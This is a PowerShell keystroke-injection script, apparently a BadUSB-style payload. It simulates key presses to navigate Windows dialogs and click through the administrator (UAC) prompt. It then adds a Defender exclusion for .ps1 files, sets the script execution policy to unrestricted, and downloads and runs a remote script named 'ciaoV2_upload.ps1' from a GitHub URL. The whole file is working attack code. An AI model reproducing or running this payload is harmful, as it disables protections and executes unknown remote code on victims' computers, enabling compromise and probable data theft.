# Function to simulate key presses
function Press-Key {
    param (
        [int]$key
    )
    Add-Type -TypeDefinition @"
        using System;
        using System.Runtime.InteropServices;
        public class Keyboard {
            [DllImport("user32.dll", SetLastError=true)]
            public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
        }
"@

    [void][Keyboard]::keybd_event($key, 0, 0, [UIntPtr]::Zero)
    Start-Sleep -Milliseconds 50
    [void][Keyboard]::keybd_event($key, 0, 2, [UIntPtr]::Zero)  # Release key
}

Start-Sleep -Milliseconds 500

Start-Sleep -Milliseconds 2500

Press-Key 0x5B # Left Windows key
Press-Key 0x64 # D key
Press-Key 0x5B # Release Windows key

Press-Key 0x5B # Left Windows key
Press-Key 0x64 # D key
Press-Key 0x5B # Release Windows key

Start-Sleep -Milliseconds 200
Press-Key 0x0D  # Press Enter

Start-Sleep -Milliseconds 1000
Press-Key 0x09  # Press Tab

Start-Sleep -Milliseconds 1000
Press-Key 0x09  # Press Tab

Start-Sleep -Milliseconds 1000
Press-Key 0x09  # Press Tab

Start-Sleep -Milliseconds 1000
Press-Key 0x09  # Press Tab

Start-Sleep -Milliseconds 1000
Press-Key 0x0D  # Press Enter

Start-Sleep -Milliseconds 200
Press-Key 0x09  # Press Tab

Start-Sleep -Milliseconds 200
Press-Key 0x09  # Press Tab

Start-Sleep -Milliseconds 200
Press-Key 0x09  # Press Tab

Start-Sleep -Milliseconds 200
Press-Key 0x09  # Press Tab

Start-Sleep -Milliseconds 200
Press-Key 0x0D  # Press Enter

Start-Sleep -Milliseconds 200
Press-Key 0x20  # Press Space

Start-Sleep -Milliseconds 2000
Press-Key 0x25  # Press Left Arrow

Start-Sleep -Milliseconds 500
Press-Key 0x0D  # Press Enter

Start-Sleep -Milliseconds 1000

# Close current window (Alt + F4)
Press-Key 0x12 # Left Alt
Press-Key 0x73 # F4
Press-Key 0x12

Start-Sleep -Milliseconds 500

# Open PowerShell as Admin
Press-Key 0x5B # Left Windows key
Press-Key 0x72 # 'r' key
Press-Key 0x5B

Start-Sleep -Milliseconds 500
[System.Windows.Forms.SendKeys]::SendWait("powershell.exe")

Start-Sleep -Milliseconds 200

Press-Key 0x11 # Left Ctrl
Press-Key 0x10 # Left Shift
Press-Key 0x0D # Press Enter
Press-Key 0x11
Press-Key 0x10

Start-Sleep -Milliseconds 2000
Press-Key 0x25  # Press Left Arrow
Start-Sleep -Milliseconds 150
Press-Key 0x0D  # Press Enter

Start-Sleep -Milliseconds 1000

# Navigate to public documents directory
[System.Windows.Forms.SendKeys]::SendWait("cd C:\\Users\\Public\\Documents")
Press-Key 0x0D  # Press Enter

# Add antivirus exclusion
[System.Windows.Forms.SendKeys]::SendWait("Add-MpPreference -ExclusionExtension ps1 -Force")
Press-Key 0x0D  # Press Enter

# Disable script execution policy
[System.Windows.Forms.SendKeys]::SendWait("Set-ExecutionPolicy unrestricted -Force")
Press-Key 0x0D  # Press Enter

# Download and execute the script
[System.Windows.Forms.SendKeys]::SendWait("wget https://raw.githubusercontent.com/idontknow-CC/gigido/main/ciaoV2_upload.ps1 -OutFile ciaoV2_upload.ps1")
Press-Key 0x0D  # Press Enter

Start-Sleep -Milliseconds 3500

[System.Windows.Forms.SendKeys]::SendWait("powershell.exe -noexit -file ciaoV2_upload.ps1")
Press-Key 0x0D  # Press Enter

# Toggle Caps Lock to signal completion
Press-Key 0x14  # Caps Lock
Start-Sleep -Milliseconds 500
Press-Key 0x14
Start-Sleep -Milliseconds 500
Press-Key 0x14
Start-Sleep -Milliseconds 500
Press-Key 0x14
